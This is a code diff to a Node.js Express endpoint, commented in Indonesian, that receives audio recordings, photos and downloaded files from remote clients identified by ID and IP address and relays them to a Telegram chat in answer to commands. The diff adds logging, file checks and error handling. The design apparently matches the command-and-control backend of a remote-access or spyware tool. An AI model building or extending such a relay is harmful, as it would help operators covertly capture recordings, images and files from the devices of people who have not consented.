@@ -843,12 +843,14 @@ app.post('/response', upload.single('media_file'), async (req, res) => {
     const { client_id, auth, ipv6, ipv4 } = req.query;
 
     // Jika ada file multipart, data JSON dilewatkan via field 'json_data' di body
-    let data;
+    let data = {};
     if (req.file) {
         try {
             data = JSON.parse(req.body.json_data || '{}');
+            console.log(`[Multipart] Client: ${client_id}, File: ${req.file.filename}, Type: ${data.type}`);
         } catch (e) {
-            data = req.body; // Fallback jika parsing gagal
+            data = req.body;
+            console.log(`[Multipart] JSON Parse Error: ${e.message}. Raw: ${req.body.json_data}`);
         }
     } else {
         data = req.body;
@@ -941,13 +943,13 @@ app.post('/response', upload.single('media_file'), async (req, res) => {
                         if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
                     }
                 };
-                if (data.type === 'audio_base64' || data.type === 'audio_multipart') {
+                if (data.type === 'audio_base64' || data.type === 'audio_multipart' || logData.type === 'audio_url') {
                     await clearPreviousNav(cmd.chat_id);
                     let audioSource;
                     const audioUrl = logData.data;
                     if (audioUrl && typeof audioUrl === 'string' && audioUrl.startsWith('/public/uploads/')) {
                         audioSource = { source: fs.createReadStream(path.join(uploadsDir, path.basename(audioUrl))), filename: `record.mp4` };
-                    } else if (data.data) {
+                    } else if (typeof data.data === 'string' && data.data.length > 100) {
                         audioSource = { source: Buffer.from(data.data, 'base64'), filename: `record.mp4` };
                     }
                     if (audioSource) {
@@ -957,23 +959,34 @@ app.post('/response', upload.single('media_file'), async (req, res) => {
                         return res.json({ status: 'received' });
                     }
                 }
-                if (data.type === 'photo_base64' || data.type === 'photo_multipart') {
+                if (data.type === 'photo_base64' || data.type === 'photo_multipart' || logData.type === 'photo_url') {
                     await clearPreviousNav(cmd.chat_id);
                     let photoSource;
                     const photoUrl = logData.data;
-                    if (photoUrl && typeof photoUrl === 'string' && photoUrl.startsWith('/public/uploads/')) {
-                        photoSource = { source: fs.createReadStream(path.join(uploadsDir, path.basename(photoUrl))) };
-                    } else if (data.data) {
+
+                    if (typeof photoUrl === 'string' && photoUrl.startsWith('/public/uploads/')) {
+                        const fullPath = path.join(uploadsDir, path.basename(photoUrl));
+                        if (fs.existsSync(fullPath)) {
+                            photoSource = { source: fs.createReadStream(fullPath) };
+                        } else {
+                            console.error(`[Telegram] File not found for sending: ${fullPath}`);
+                        }
+                    } else if (typeof data.data === 'string' && data.data.length > 100) {
                         photoSource = { source: Buffer.from(data.data, 'base64') };
                     }
+
                     if (photoSource) {
-                        const sent = await bot.telegram.sendPhoto(cmd.chat_id, photoSource, { caption: `📸 Foto (${client_id})`, parse_mode: 'HTML', ...getNavOpts() });
-                        if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
-                        if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
-                        return res.json({ status: 'received' });
+                        try {
+                            const sent = await bot.telegram.sendPhoto(cmd.chat_id, photoSource, { caption: `📸 Foto (${client_id})`, parse_mode: 'HTML', ...getNavOpts() });
+                            if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
+                            if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
+                            return res.json({ status: 'received' });
+                        } catch (sendErr) {
+                            console.error(`[Telegram] sendPhoto error: ${sendErr.message}`);
+                        }
                     }
                 }
-                if ((data.type === 'file_download' || data.type === 'file_multipart')) {
+                if (data.type === 'file_download' || data.type === 'file_multipart' || logData.type === 'file_download_url') {
                     await clearPreviousNav(cmd.chat_id);
                     let docSource;
                     const dlUrl = logData.data?.url || (typeof logData.data === 'string' ? logData.data : null);
